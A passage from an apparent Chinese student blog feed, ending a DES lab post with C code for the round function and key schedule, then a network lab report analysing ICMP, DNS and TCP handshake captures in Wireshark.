src="/2023/12/15/mi-ma-xue-shi-yan-3-lun-chai-fen-gong-ji-des-suan-fa/1.png"></p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">/* critical cryptographic trans, num: index number of this iter迭代的序号数 */</span><span class="token keyword">void</span> <span class="token function">f</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> right<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token keyword">int</span> num<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">char</span> fret<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span>      <span class="token punctuation">{</span>  <span class="token keyword">register</span> <span class="token keyword">char</span> <span class="token operator">*</span>kb<span class="token punctuation">,</span> <span class="token operator">*</span>rb<span class="token punctuation">,</span> <span class="token operator">*</span>bb<span class="token punctuation">;</span>  <span class="token comment">/* ptr to key selection &amp;c  */</span>  <span class="token keyword">char</span> bigright<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment">/* right expanded to 48 bits  */</span>  <span class="token keyword">char</span> result<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">;</span>      <span class="token comment">/* expand(R) XOR keyselect[num] */</span>  <span class="token keyword">char</span> preout<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span>      <span class="token comment">/* result of 32-bit permutation */</span>  kb <span class="token operator">=</span> kn<span class="token punctuation">[</span>num<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token comment">/* fast version of iteration  */</span>  bb <span class="token operator">=</span> bigright<span class="token punctuation">;</span>  rb <span class="token operator">=</span> result<span class="token punctuation">;</span>  <span class="token function">expand</span><span class="token punctuation">(</span>right<span class="token punctuation">,</span>bb<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">/* expand to 48 bits    */</span>  <span class="token operator">*</span>rb<span class="token operator">++</span> <span class="token operator">=</span> <span class="token operator">*</span>bb<span class="token operator">++</span> <span class="token operator">^</span> <span class="token operator">*</span>kb<span class="token operator">++</span><span class="token punctuation">;</span>       <span class="token comment">/* expanded R XOR chunk of key  */</span>  <span class="token operator">*</span>rb<span class="token operator">++</span> <span class="token operator">=</span> <span class="token operator">*</span>bb<span class="token operator">++</span> <span class="token operator">^</span> <span class="token operator">*</span>kb<span class="token operator">++</span><span class="token punctuation">;</span>  <span class="token operator">*</span>rb<span class="token operator">++</span> <span class="token operator">=</span> <span class="token operator">*</span>bb<span class="token operator">++</span> <span class="token operator">^</span> <span class="token operator">*</span>kb<span class="token operator">++</span><span class="token punctuation">;</span>  <span class="token operator">*</span>rb<span class="token operator">++</span> <span class="token operator">=</span> <span class="token operator">*</span>bb<span class="token operator">++</span> <span class="token operator">^</span> <span class="token operator">*</span>kb<span class="token operator">++</span><span class="token punctuation">;</span>  <span class="token operator">*</span>rb<span class="token operator">++</span> <span class="token operator">=</span> <span class="token operator">*</span>bb<span class="token operator">++</span> <span class="token operator">^</span> <span class="token operator">*</span>kb<span class="token operator">++</span><span class="token punctuation">;</span>  <span class="token operator">*</span>rb<span class="token operator">++</span> <span class="token operator">=</span> <span class="token operator">*</span>bb<span class="token operator">++</span> <span class="token operator">^</span> <span class="token operator">*</span>kb<span class="token operator">++</span><span class="token punctuation">;</span>  <span class="token function">contract</span><span class="token punctuation">(</span>result<span class="token punctuation">,</span>preout<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment">/* use S fns to get 32 bits  */</span>  <span class="token function">perm32</span><span class="token punctuation">(</span>preout<span class="token punctuation">,</span> p32<span class="token punctuation">,</span> fret<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">/* and do final 32-bit perm  */</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>kinit函数，密钥初始函数</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">/* 64 bits (will use only 56)   */</span><span class="token keyword">void</span> <span class="token function">kinit</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> key<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token comment">/* initialize key schedule array*/</span><span class="token punctuation">{</span>  <span class="token keyword">register</span> <span class="token keyword">int</span> i<span class="token punctuation">,</span>j<span class="token punctuation">,</span>l<span class="token punctuation">;</span>  <span class="token keyword">int</span> m<span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span>j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> j<span class="token operator">&lt;</span><span class="token number">56</span><span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token comment">/* convert pc1 to bits of key   */</span>    l<span class="token operator">=</span>pc1<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>                <span class="token comment">/* integer bit location    */</span> <span class="token comment">//pc1 数组是DES算法中的一个置换表，将64位密钥转换为56位。</span>    m <span class="token operator">=</span> l <span class="token operator">&amp;</span> <span class="token number">07</span><span class="token punctuation">;</span>                <span class="token comment">/* find bit      */</span>  <span class="token comment">/* find which key byte l is in and which bit of that byte, and store 1-bit   * result */</span>    pc1m<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">(</span>key<span class="token punctuation">[</span>l<span class="token operator">&gt;&gt;</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">&amp;</span> bytebit<span class="token punctuation">[</span>m<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token number">1</span> <span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token comment">//将输入的64位密钥转换为56位，并存储在 pc1m 数组中</span>  <span class="token punctuation">}</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">16</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>         <span class="token comment">/* for each key sched section */</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> j<span class="token operator">&lt;</span><span class="token number">6</span><span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token comment">/* and each byte of the kn */</span>      kn<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>              <span class="token comment">/* clear it for accumulation */</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">16</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token comment">/* key chunk for each iteration */</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> j<span class="token operator">&lt;</span><span class="token number">56</span><span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span>       <span class="token comment">/* rotate pc1 the right amount */</span>      <span class="token comment">/* rotate left and right halves independently */</span>      pcr<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> pc1m<span class="token punctuation">[</span><span class="token punctuation">(</span>l<span class="token operator">=</span>j<span class="token operator">+</span>totrot<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token punctuation">(</span>j<span class="token operator">&lt;</span><span class="token number">28</span><span class="token operator">?</span> <span class="token number">28</span> <span class="token operator">:</span> <span class="token number">56</span><span class="token punctuation">)</span> <span class="token operator">?</span> l<span class="token operator">:</span> l<span class="token operator">-</span><span class="token number">28</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> j<span class="token operator">&lt;</span><span class="token number">48</span><span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span>       <span class="token comment">/* select bits individually  */</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>pcr<span class="token punctuation">[</span>pc2<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>      <span class="token comment">/* check bit that goes to kn[j] */</span>        l<span class="token operator">=</span> j <span class="token operator">&amp;</span> <span class="token number">0x7</span><span class="token punctuation">;</span>        kn<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token operator">&gt;&gt;</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">|=</span> bytebit<span class="token punctuation">[</span>l<span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">/* mask it in if it's there */</span>      <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.csdn.net/qq_44143499/article/details/105821846">DES加密算法具体步骤详解</a></p>]]></content>
      
      
      <categories>
          
          <category> cryptography </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cryptography </tag>
            
            <tag> experiment </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机网络课间实验</title>
      <link href="/2023/12/15/ji-suan-ji-wang-luo-ke-jian-shi-yan/"/>
      <url>/2023/12/15/ji-suan-ji-wang-luo-ke-jian-shi-yan/</url>
      
        <content type="html"><![CDATA[<h2 id="1-实验内容"><a href="#1-实验内容" class="headerlink" title="1 实验内容"></a>1 实验内容</h2><p>一、 ICMP报文分析</p><p>\1. 使用ping命令，在终端ping一个有效地址：</p><p>（1）截图示意说明ICMP、IP数据包结构和含义</p><p>（2）分别说明request和reply包</p><p>\2. ping一个无效地址：</p><p>（1）截图示意说明ICMP、IP数据包结构和含义</p><p>（2）分别说明request和reply包</p><p>二、访问任意http网站和https网站并抓包，分析从PC访问到结束访问网站的全数据流过程</p><p>\1. 分析DNS解析过程及请求回应报文结构，掌握DNS报文结构特征和DNS A记录</p><p>  （1）nslookup –qt=a  xxx.com  查询域名的A记录</p><p>截图示意说明DNS数据包结构和含义</p><p>分别说明request和response包</p><p>（2）nslookup查询一个无效地址：</p><p>截图示意说明DNS数据包结构和含义</p><p>分别说明request和response包</p><p>\2. 分析PC和网站建立连接和断开连接的过程(TCP三次握手、四次挥手、RST包抓包)</p><p>\3. 分析网络层IP协议工作原理及常见字段，判断是否存在分片重组</p><p>\4. 分析链路层ARP请求报文和响应报文，分析ARP协议工作原理及常见字段</p><p>\5. 分析HTTP请求报文和响应报文，分析HTTP工作原理及常见字段</p><p>\6. 分析HTTPS请求报文和响应报文，分析HTTPS工作原理及常见字段</p><h2 id="2实验步骤与分析"><a href="#2实验步骤与分析" class="headerlink" title="2实验步骤与分析"></a>2实验步骤与分析</h2><h3 id="2-1CMP报文分析"><a href="#2-1CMP报文分析" class="headerlink" title="2.1CMP报文分析"></a>2.1CMP报文分析</h3><h4 id="2-1-1使用ping命令，在终端ping-一个有效地址“github-com”"><a href="#2-1-1使用ping命令，在终端ping-一个有效地址“github-com”" class="headerlink" title="2.1.1使用ping命令，在终端ping 一个有效地址“github.com”"></a>2.1.1使用ping命令，在终端ping 一个有效地址“github.com”</h4><p><img src="/2023/12/15/ji-suan-ji-wang-luo-ke-jian-shi-yan/wps1.jpg"> </p><p>Request包</p><p><img src="/2023/12/15/ji-suan-ji-wang-luo-ke-jian-shi-yan/wps2.jpg"> </p><p>ICMP数据包结构</p><p><img src="/2023/12/15/ji-suan-ji-wang-luo-ke-jian-shi-yan/wps3.jpg"> </p><p><img src="/2023/12/15/ji-suan-ji-wang-luo-ke-jian-shi-yan/wps4.jpg"> </p><p>Type: 该字段有1个字节，表示特定类型的 ICMP 报文。一台主机向一个节点发送一个类型字段值为8的ICMP报文，如果途中没有异常（如果没有被路由丢弃，目标不回应ICMP或者传输失败），则目标返回类型字段值为0的ICMP报文，说明这台主机存在。</p><p>Code: 该字段有1个字节，进一步细分 ICMP 的类型。如上图所示，Type 的值为 8，Code 的值为0，表示回显请求。</p><p>Checksum: 该字段有2个字节，表示校验和。</p><p>Identifier: 该字段有2个字节，用于匹配 Request/Reply 的标识符。</p><p>Seq Num: 该字段有2个字节，用于匹配 Request/Reply 的序列号。</p><p>Data: 该字段有4个字节，数据载荷。</p><p>IP数据包结构</p><p><img src="/2023/12/15/ji-suan-ji-wang-luo-ke-jian-shi-yan/wps5.jpg"> </p><p>如上图所示，可以看到 IP 数据包的信息：</p><p>Version: 4，表示 IPv4。</p><p>Header Length: 报头长度20 bytes。</p><p>Time to live： 64， 生存时间。</p><p>Protocol: 1，表示 ICMP。</p><p>Source: 10.201.96.44，源 IP 地址。</p><p>Destination: 20.205.243.166，目的 IP 地址。</p><p>Reply包</p><p><img src="/2023/12/15/ji-suan-ji-wang-luo-ke-jian-shi-yan/wps6.jpg"> </p><p>ICMP数据包结构</p><p><img src="/2023/12/15/ji-suan-ji-wang-luo-ke-jian-shi-yan/wps7.jpg"> </p><p><img src="/2023/12/15/ji-suan-ji-wang-luo-ke-jian-shi-yan/wps8.jpg"> </p><p>Type: 该字段有1个字节，表示特定类型的 ICMP 报文。当ICMP数据包的类型字段为0时，表示该数据包是一个回显回答（Echo Reply）消息。</p><p>Code: 该字段有1个字节，进一步细分 ICMP 的类型。如上图所示，Type 的值为 0，Code 的值为0，表示回显回答。</p><p>Checksum: 该字段有2个字节，表示校验和。</p><p>Identifier: 该字段有2个字节，用于匹配 Request/Reply 的标识符。</p><p>Seq Num: 该字段有2个字节，用于匹配 Request/Reply 的序列号。</p><p>Data: 该字段有4个字节，数据载荷。</p><p>IP数据包结构</p><p><img src="/2023/12/15/ji-suan-ji-wang-luo-ke-jian-shi-yan/wps9.jpg"> </p><p>如上图所示，可以看到 IP 数据包的信息：</p><p>Version: 4，表示 IPv4。</p><p>Header Length: 报头长度20 bytes。</p><p>Time to live： 64， 生存时间。</p><p>Protocol: 1，表示 ICMP。</p><p>Source: 20.205.243.166，源 IP 地址。</p><p>Destination: 10.201.96.44，目的 IP 地址。</p><h4 id="2-1-2使用ping命令，在终端ping-一个无效地址199-199-199-199"><a href="#2-1-2使用ping命令，在终端ping-一个无效地址199-199-199-199" class="headerlink" title="2.1.2使用ping命令，在终端ping 一个无效地址199.199.199.199"></a>2.1.2使用ping命令，在终端ping 一个无效地址199.199.199.199</h4><p><img src="/2023/12/15/ji-suan-ji-wang-luo-ke-jian-shi-yan/wps10.jpg"> </p><p>只能获取request包</p><p><img src="/2023/12/15/ji-suan-ji-wang-luo-ke-jian-shi-yan/wps11.jpg"> </p><p>ICMP数据包结构</p><p><img src="/2023/12/15/ji-suan-ji-wang-luo-ke-jian-shi-yan/wps12.jpg"> </p><p><img src="/2023/12/15/ji-suan-ji-wang-luo-ke-jian-shi-yan/wps13.jpg"> </p><p>Type: 该字段有1个字节，表示特定类型的 ICMP 报文。一台主机向一个节点发送一个类型字段值为8的ICMP报文。</p><p>Code: 该字段有1个字节，进一步细分 ICMP 的类型。如上图所示，Type 的值为 8，Code 的值为0，表示回显请求。</p><p>Checksum: 该字段有2个字节，表示校验和。</p><p>Identifier: 该字段有2个字节，用于匹配 Request/Reply 的标识符。</p><p>Seq Num: 该字段有2个字节，用于匹配 Request/Reply 的序列号。</p><p>Data: 该字段有4个字节，数据载荷。</p><p>IP数据包结构</p><p><img src="/2023/12/15/ji-suan-ji-wang-luo-ke-jian-shi-yan/wps14.jpg"> </p><p>如上图所示，可以看到 IP 数据包的信息：</p><p>Version: 4，表示 IPv4。</p><p>Header Length: 报头长度20 bytes。</p><p>Time to live： 64， 生存时间。</p><p>Protocol: 1，表示 ICMP。</p><p>Source: 10.201.96.44，源 IP 地址。</p><p>Destination: 199.199.199.199，目的 IP 地址。</p><h3 id="2-2访问任意http网站和https网站并抓包，分析从PC访问到结束访问网站的全数据流过程"><a href="#2-2访问任意http网站和https网站并抓包，分析从PC访问到结束访问网站的全数据流过程" class="headerlink" title="2.2访问任意http网站和https网站并抓包，分析从PC访问到结束访问网站的全数据流过程"></a>2.2访问任意http网站和https网站并抓包，分析从PC访问到结束访问网站的全数据流过程</h3><h4 id="2-2-1-分析DNS解析过程及请求回应报文结构，掌握DNS报文结构特征和DNS-A记录"><a href="#2-2-1-分析DNS解析过程及请求回应报文结构，掌握DNS报文结构特征和DNS-A记录" class="headerlink" title="2.2.1. 分析DNS解析过程及请求回应报文结构，掌握DNS报文结构特征和DNS A记录"></a>2.2.1. 分析DNS解析过程及请求回应报文结构，掌握DNS报文结构特征和DNS A记录</h4><p>nslookup查询b站域名的A记录(这里使用百度的公共 DNS 服务器180.76.76.76)</p><p><img src="/2023/12/15/ji-suan-ji-wang-luo-ke-jian-shi-yan/wps15.jpg"> </p><p>获取DNS数据包</p><p><img src="/2023/12/15/ji-suan-ji-wang-luo-ke-jian-shi-yan/wps16.jpg"> </p><p>request包</p><p><img src="/2023/12/15/ji-suan-ji-wang-luo-ke-jian-shi-yan/wps17.jpg"> </p><p>数据包结构</p><p><img src="/2023/12/15/ji-suan-ji-wang-luo-ke-jian-shi-yan/wps18.jpg"> </p><p>UDP数据帧分析</p><p><img src="/2023/12/15/ji-suan-ji-wang-luo-ke-jian-shi-yan/wps19.jpg"> </p><p>格式如下：</p><p>SP:该字段占2个字节，源端口号为50241</p><p>DP: 该字段占2个字节，目的端口号为53</p><p>Length: 该字段占2个字节，长度，42bytes</p><p>Checksum: 该字段占2个字节，校验和</p><p>DNS报文分析</p><p><img src="/2023/12/15/ji-suan-ji-wang-luo-ke-jian-shi-yan/wps20.jpg"> </p><p>DNS报文结构为：</p><p><img src="/2023/12/15/ji-suan-ji-wang-luo-ke-jian-shi-yan/wps21.jpg"> </p><p>第一个是Transaction ID为标识字段,2字节,用于辨别DNS应答报文是哪个请求报文的响应.图中报文标识数为：0x0002。</p><p>第二个是Flags标志字段,如图所示：</p><p><img src="/2023/12/15/ji-suan-ji-wang-luo-ke-jian-shi-yan/wps22.jpg"></p><p>QR(1比特)：查询/响应的标志位，1为响应，0为查询。</p><p>opcode(4比特)：定义查询或响应的类型(若为0则表示是标准的，若为1则是反向的，若为2则是服务器状态请求)。</p><p>AA(1比特)：授权回答的标志位。该位在响应报文中有效，1表示名字服务器是权限服务器</p><p>TC(1比特)：截断标志位。1表示响应已超过512字节并已被截断、</p><p>RD(1比特)：该位为1表示客户端希望得到递归回答</p><p>RA(1比特)：只能在响应报文中置为1，表示可以得到递归响应。</p><p>zero(3比特)：不说也知道都是0了，保留字段。</p><p>rcode(4比特)：返回码，表示响应的差错状态，通常为0和3，各取值含义如下：</p><p>0：表示无差错， 1：表示格式差错 ，2：表示问题在域名服务器上，3; 表示域参照问题</p><p>4: 表示查询类型不支持 ，5: 表示在管理上被禁止 ，6 – 15: 表示保留</p><p>接下来问题数、回答资源记录数、授权资源记录数、附加资源记录数：这四个字段都是两字节，分别对应下面的查询问题、回答、授权和附加信息部分的数量。在图中报文对应字段分别为1,0,0,0；</p><p>第七个是Queries为查询问题区域，其包含正在进行的查询信息。包含查询名(被查询主机名字的名字字段)、查询类型、查询类。图中报文查询名为：<a href="https://link.zhihu.com/?target=http://www.baidu.com/">www.bilibili.com</a>,查询类型为：A（IPv4地址）,查询类为：IN（Internet数据）。（观察报文发现图中报文仅有查询问题区域,故不做其他区域的分析）</p><p>Response包</p><p><img src="/2023/12/15/ji-suan-ji-wang-luo-ke-jian-shi-yan/wps23.jpg"> </p><p>数据包结构</p><p><img src="/2023/12/15/ji-suan-ji-wang-luo-ke-jian-shi-yan/wps24.jpg"> </p><p>UDP数据帧分析</p><p><img src="/2023/12/15/ji-suan-ji-wang-luo-ke-jian-shi-yan/wps25.jpg"> </p><p>格式如下：</p><p>SP:该字段占2个字节，源端口号为53</p><p>DP: 该字段占2个字节，目的端口号为50241</p><p>Length: 该字段占2个字节，长度，362bytes</p><p>Checksum: 该字段占2个字节，校验和</p><p>DNS报文分析</p><p><img src="/2023/12/15/ji-suan-ji-wang-luo-ke-jian-shi-yan/wps26.jpg"> </p><p>DNS报文结构为：</p><p><img src="/2023/12/15/ji-suan-ji-wang-luo-ke-jian-shi-yan/wps27.jpg"> </p><p>第一个是Transaction ID为标识字段,2字节,用于辨别DNS应答报文是哪个请求报文的响应.图中报文标识数为：0x0002。</p><p>第二个是Flags标志字段,如图所示：</p><p><img src="/2023/12/15/ji-suan-ji-wang-luo-ke-jian-shi-yan/wps28.jpg"></p><p>QR(1比特)：查询/响应的标志位，1为响应，0为查询。</p><p>opcode(4比特)：定义查询或响应的类型(若为0则表示是标准的，若为1则是反向的，若为2则是服务器状态请求)。</p><p>AA(1比特)：授权回答的标志位。该位在响应报文中有效，1表示名字服务器是权限服务器</p><p>TC(1比特)：截断标志位。1表示响应已超过512字节并已被截断</p><p>RD(1比特)：该位为1表示客户端希望得到递归回答</p><p>RA(1比特)：只能在响应报文中置为1，表示可以得到递归响应。</p><p>zero(3比特)：不说也知道都是0了，保留字段。</p><p>rcode(4比特)：返回码，表示响应的差错状态，通常为0和3，各取值含义如下：</p><p>0：表示无差错， 1：表示格式差错 ，2：表示问题在域名服务器上，3; 表示域参照问题</p><p>4: 表示查询类型不支持 ，5: 表示在管理上被禁止 ，6 – 15: 表示保留</p><p>接下来问题数、回答资源记录数、授权资源记录数、附加资源记录数：这四个字段都是两字节，分别对应下面的查询问题、回答、授权和附加信息部分的数量。在图中报文对应字段分别为1,20,0,0；</p><p>第七个是Queries为询问题区域，其包含正在进行的查询信息。包含查询名(被查询主机名字的名字字段)、查询类型、查询类。图中报文查询名为：<a href="https://link.zhihu.com/?target=http://www.baidu.com/">www.bilibili.com</a>,查询类型为：A（IPv4地址）,查询类为：IN（Internet数据）。第八个是Answers为回答区域，包含了查询的域名，指定了回答的资源记录类型，”A”记录表示IPv4地址，以及生存时间（TTL）2min9s，指定了回答的资源记录可以被缓存的时间，解析得的ip地址等</p><p>nslookup查询一个无效地址<a href="http://www.oppp.com/">www.oppp.com</a></p><p><img src="/2023/12/15/ji-suan-ji-wang-luo-ke-jian-shi-yan/wps29.jpg"> </p><p>request包</p><p><img src="/2023/12/15/ji-suan-ji-wang-luo-ke-jian-shi-yan/wps30.jpg"> </p><p>UDP数据帧分析</p><p><img src="/2023/12/15/ji-suan-ji-wang-luo-ke-jian-shi-yan/wps31.jpg"> </p><p>格式如下：</p><p>SP:该字段占2个字节，源端口号为60222</p><p>DP: 该字段占2个字节，目的端口号为53</p><p>Length: 该字段占2个字节，长度，38bytes</p><p>Checksum: 该字段占2个字节，校验和</p><p>DNS报文分析</p><p><img src="/2023/12/15/ji-suan-ji-wang-luo-ke-jian-shi-yan/wps32.jpg"> </p><p>DNS报文结构为：</p><p><img src="/2023/12/15/ji-suan-ji-wang-luo-ke-jian-shi-yan/wps33.jpg"> </p><p>第一个是Transaction ID为标识字段,2字节,用于辨别DNS应答报文是哪个请求报文的响应.图中报文标识数为：0x0002。</p><p>第二个是Flags标志字段,如图所示：</p><p><img src="/2023/12/15/ji-suan-ji-wang-luo-ke-jian-shi-yan/wps34.jpg"></p><p>QR(1比特)：查询/响应的标志位，1为响应，0为查询。</p><p>opcode(4比特)：定义查询或响应的类型(若为0则表示是标准的，若为1则是反向的，若为2则是服务器状态请求)。</p><p>AA(1比特)：授权回答的标志位。该位在响应报文中有效，1表示名字服务器是权限服务器(关于权限服务器以后再讨论)</p><p>TC(1比特)：截断标志位。1表示响应已超过512字节并已被截断</p><p>RD(1比特)：该位为1表示客户端希望得到递归回答</p><p>RA(1比特)：只能在响应报文中置为1，表示可以得到递归响应。</p><p>zero(3比特)：不说也知道都是0了，保留字段。</p><p>rcode(4比特)：返回码，表示响应的差错状态，通常为0和3，各取值含义如下：</p><p>0：表示无差错， 1：表示格式差错 ，2：表示问题在域名服务器上，3; 表示域参照问题</p><p>4: 表示查询类型不支持 ，5: 表示在管理上被禁止 ，6 – 15: 表示保留</p><p>接下来问题数、回答资源记录数、授权资源记录数、附加资源记录数：这四个字段都是两字节，分别对应下面的查询问题、回答、授权和附加信息部分的数量。在图中报文对应字段分别为1,0,0,0；</p><p>第七个是Queries为查询问题区域，其包含正在进行的查询信息。包含查询名(被查询主机名字的名字字段)、查询类型、查询类。图中报文查询名为：<a href="https://link.zhihu.com/?target=http://www.baidu.com/">www.oppp.com</a>,查询类型为：A（IPv4地址）,查询类为：IN（Internet数据）。</p><p>Response包</p><p><img src="/2023/12/15/ji-suan-ji-wang-luo-ke-jian-shi-yan/wps35.jpg"> </p><p>UDP数据帧分析</p><p><img src="/2023/12/15/ji-suan-ji-wang-luo-ke-jian-shi-yan/wps36.jpg"> </p><p>格式如下：</p><p>SP:该字段占2个字节，源端口号为53</p><p>DP: 该字段占2个字节，目的端口号为60222</p><p>Length: 该字段占2个字节，长度，88bytes</p><p>Checksum: 该字段占2个字节，校验和</p><p>DNS报文分析</p><p><img src="/2023/12/15/ji-suan-ji-wang-luo-ke-jian-shi-yan/wps37.jpg"> </p><p>DNS报文结构为：</p><p><img src="/2023/12/15/ji-suan-ji-wang-luo-ke-jian-shi-yan/wps38.jpg"> </p><p>第一个是Transaction ID为标识字段,2字节,用于辨别DNS应答报文是哪个请求报文的响应.图中报文标识数为：0x0002。</p><p>第二个是Flags标志字段,如图所示：</p><p><img src="/2023/12/15/ji-suan-ji-wang-luo-ke-jian-shi-yan/wps39.jpg"></p><p>QR(1比特)：查询/响应的标志位，1为响应，0为查询。</p><p>opcode(4比特)：定义查询或响应的类型(若为0则表示是标准的，若为1则是反向的，若为2则是服务器状态请求)。</p><p>AA(1比特)：授权回答的标志位。该位在响应报文中有效，1表示名字服务器是权限服务器</p><p>TC(1比特)：截断标志位。1表示响应已超过512字节并已被截断</p><p>RD(1比特)：该位为1表示客户端希望得到递归回答</p><p>RA(1比特)：只能在响应报文中置为1，表示可以得到递归响应。</p><p>zero(3比特)：不说也知道都是0了，保留字段。</p><p>rcode(4比特)：返回码，表示响应的差错状态，通常为0和3，各取值含义如下：</p><p>0：表示无差错， 1：表示格式差错 ，2：表示问题在域名服务器上，3; 表示域参照问题</p><p>4: 表示查询类型不支持 ，5: 表示在管理上被禁止 ，6 – 15: 表示保留</p><p>接下来问题数、回答资源记录数、授权资源记录数、附加资源记录数：这四个字段都是两字节，分别对应下面的查询问题、回答、授权和附加信息部分的数量。在图中报文对应字段分别为1,0,1,0；</p><p>第七个是Queries为查询问题区域，其包含正在进行的查询信息。包含查询名(被查询主机名字的名字字段)、查询类型、查询类。图中报文查询名为：<a href="https://link.zhihu.com/?target=http://www.baidu.com/">www.oppp.com</a>,查询类型为：A（IPv4地址）,查询类为：IN（Internet数据）。</p><p>第八个是Authority为授权区域，包含了查询的域名，指定了授权的资源记录类型，标识为”SOA”，表示这是一个Start of Authority资源记录。以及生存时间（TTL）10min等</p><h4 id="2-2-2分析PC和网站建立连接和断开连接的过程-TCP三次握手、四次挥手、RST包抓包"><a href="#2-2-2分析PC和网站建立连接和断开连接的过程-TCP三次握手、四次挥手、RST包抓包" class="headerlink" title="2.2.2分析PC和网站建立连接和断开连接的过程(TCP三次握手、四次挥手、RST包抓包)"></a>2.2.2分析PC和网站建立连接和断开连接的过程(TCP三次握手、四次挥手、RST包抓包)</h4><p>打开一个新的浏览器输入<a href="http://www.bilibili.com/">www.bilibili.com</a> 然后在后台开启wireshark的抓包功能</p><p>通过cmd窗口下的ipconfig查看电脑本地IP地址为10.201.96.44</p><p><img src="/2023/12/15/ji-suan-ji-wang-luo-ke-jian-shi-yan/wps40.jpg"> </p><p>查询一下b站IP地址发现是171.214.10.140</p><p><img src="/2023/12/15/ji-suan-ji-wang-luo-ke-jian-shi-yan/wps41.jpg"> </p><p>筛选条件ip.src == 171.214.10.140 or ip.dst == 171.214.10.140查询</p><p><img src="/2023/12/15/ji-suan-ji-wang-luo-ke-jian-shi-yan/wps42.jpg"> </p><p>前面的三个报文就是TCP的三次握手过程：SYN包，SYN ACK包，ACK报文。</p><p>方框处也就是“三次握手的结果。</p><p>第一次的标志是“[SYN]”,序列号seq为0， 代表客户端请求建立连接</p><p>第二次的标志是“[SYN, ACK]”,序列号Seq为0，Ack值为客户端发送过来的Seq加1，也就是1，表示服务器可以正常接收客户端数据包。</p><p>第三次的标志是“[ACK]”,客户端表示可以正常接收服务器数据包，这是为了保证可以全双工通讯，接下来就可以正常发送数据。</p><p><img src="/2023/12/15/ji-suan-ji-wang-luo-ke-jian-shi-yan/wps43.jpg"> </p><p>展开看详情：</p><p>第一次握手的报文如下：这是客户端发起给服务器的报文，用于请求建立连接。</p><p><img src="/2023/12/15/ji-suan-ji-wang-luo-ke-jian-shi-yan/wps44.jpg"> 